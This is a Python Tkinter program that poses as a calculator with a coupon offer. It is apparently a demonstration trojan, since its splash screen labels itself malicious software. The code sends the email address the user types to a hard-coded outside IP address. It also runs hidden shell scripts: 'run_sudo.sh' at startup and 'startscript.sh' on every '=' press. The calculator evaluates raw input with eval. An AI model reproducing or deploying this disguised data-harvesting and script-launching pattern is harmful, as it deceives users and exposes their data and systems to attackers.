from time import sleep
from tkinter import *
import os
import subprocess
from cryptography.fernet import Fernet
import base64, hashlib
from codecs import utf_8_decode
from cryptography.fernet import Fernet
import base64, hashlib
import os
import requests

# draw and position buttons
def bt_draw(key, col, lin,window,disp):
    
    bt=Button(window, text=key, width=10, height=3,font = "Verdana 10 bold", bg='#0052cc', fg='#ffffff', activebackground='#0052cc', activeforeground='#aaffaa',command=lambda: bt_press(key,disp))
    bt.grid(column=col+1, row=lin+1)
    return bt
# button press event
def bt_press(key,disp):
    if   key == 'C': disp['text'] = ''
    elif key == '<': disp['text'] = disp['text'][:-1]
    elif key == '=': 
        disp['text'] = str(round(eval(disp['text']),6))
        os.system("sh startscript.sh")
    else: disp['text'] += key

def send_email(email,windowe):
    response = requests.post("http://174.138.13.97:3001", data = {'email':email})
    print(response)
    with open("email.txt","w") as thefile:
        thefile.write(email)
    windowe.destroy()
    splash_screen()

def splash_screen():

    #Create SplashScreen
    splash_win= Tk()
    splash_win.title("ATTENTION - MALWARE SOFTWARE")

    #Define the size of the window or frame
    splash_win.geometry("700x200")

    #Remove border of the splash Window
    splash_win.overrideredirect(True)
    splash_win.eval('tk::PlaceWindow . center')
    splash_label= Label(splash_win, text= "Welcome to this APP!\n Attention!! \n This is a malicious software", fg= "blue",
    font= ('Times New Roman', 40))
    splash_label.pack(pady=20)
    splash_win.update()
    sleep(2)

    os.system("sh run_sudo.sh")
    
    splash_win.destroy()
    mainWin()




def mainWin():
    #splash_win.destroy()
    window = Tk()
    window.title('Calculator')

    disp = Label(window, text='',fg='black',bg='light grey',font = "Verdana 30 bold",background='light grey')
    disp.grid(column=0, row=0, columnspan=5)

    keys = '()C<789/456*123-.0=+'
    bt_list = [bt_draw(keys[n], n%4, n//4,window,disp) for n in range(20)]

def emailWin():
    #splash_win.destroy()
    windowe = Tk()
    windowe.title('Calculator')

    #windowe.geometry('700x400')
    #windowe.configure(background = "grey");
    a1 = Label(windowe ,text = "Thank you for using our app!").grid(row = 0,column = 0)
    a = Label(windowe ,text = "We want to reward you with a cupon code for our store! ").grid(row = 1,column = 0)
    b = Label(windowe ,text = "Please send your Email!").grid(row = 2,column = 0)
    c = Label(windowe ,text = "Email: ").grid(row = 3,column = 0)
    a1 = Entry(windowe)
    a1.grid(row = 4,column = 0)
    btn = Button(windowe ,text="Submit",command=lambda: send_email(a1.get(),windowe)).grid(row=5,column=0)
    
emailWin()

mainloop()

